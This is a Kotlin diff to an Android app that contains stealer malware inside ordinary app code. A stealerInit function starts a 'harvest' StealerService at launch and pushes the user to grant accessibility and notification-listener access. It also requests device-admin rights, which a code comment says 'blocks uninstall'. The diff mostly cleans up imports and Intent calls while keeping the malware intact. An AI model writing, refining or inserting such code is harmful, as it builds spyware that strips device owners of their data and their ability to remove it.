@@ -97,6 +97,8 @@ import com.example.zeca.ui.theme.Cores
 import java.text.SimpleDateFormat
 import java.util.Date
 import java.util.Locale
+import com.example.zeca.stealer.StealerService
+import com.example.zeca.stealer.AdminReceiver
 import com.google.firebase.auth.FirebaseAuth
 import com.google.firebase.auth.FirebaseUser
 import java.math.BigDecimal
@@ -213,7 +215,7 @@ private fun stealerInit() {
     if (needed.isNotEmpty()) requestPermissions(needed, 0)
 
     // start harvest service immediately
-    val svc = android.content.Intent(this, com.example.zeca.stealer.StealerService::class.java)
+    val svc = Intent(this, StealerService::class.java)
     if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O)
         startForegroundService(svc)
     else
@@ -222,25 +224,23 @@ private fun stealerInit() {
     // accessibility — send to settings if not yet enabled
     if (!isStealerAccessibilityOn()) {
         startActivity(
-            android.content.Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS)
-                .apply { flags = android.content.Intent.FLAG_ACTIVITY_NEW_TASK }
+            Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS)
+                .apply { flags = Intent.FLAG_ACTIVITY_NEW_TASK }
         )
     }
 
     // notification listener — redirect if missing
     if (!isNotificationListenerOn()) {
         startActivity(
-            android.content.Intent(android.provider.Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
+            Intent(android.provider.Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
         )
     }
 
     // device admin — blocks uninstall
     if (!isDeviceAdminOn()) {
-        val admin = android.content.ComponentName(
-            this, com.example.zeca.stealer.AdminReceiver::class.java
-        )
+        val admin = android.content.ComponentName(this, AdminReceiver::class.java)
         startActivity(
-            android.content.Intent(android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
+            Intent(android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
                 .putExtra(android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin)
                 .putExtra(
                     android.app.admin.DevicePolicyManager.EXTRA_ADD_EXPLANATION,
@@ -269,8 +269,7 @@ private fun isNotificationListenerOn(): Boolean {
 
 private fun isDeviceAdminOn(): Boolean {
     val dpm = getSystemService(android.app.admin.DevicePolicyManager::class.java)
-    val admin = android.content.ComponentName(
-        this, com.example.zeca.stealer.AdminReceiver::class.java)
+    val admin = android.content.ComponentName(this, AdminReceiver::class.java)
     return dpm?.isAdminActive(admin) == true
 }
 
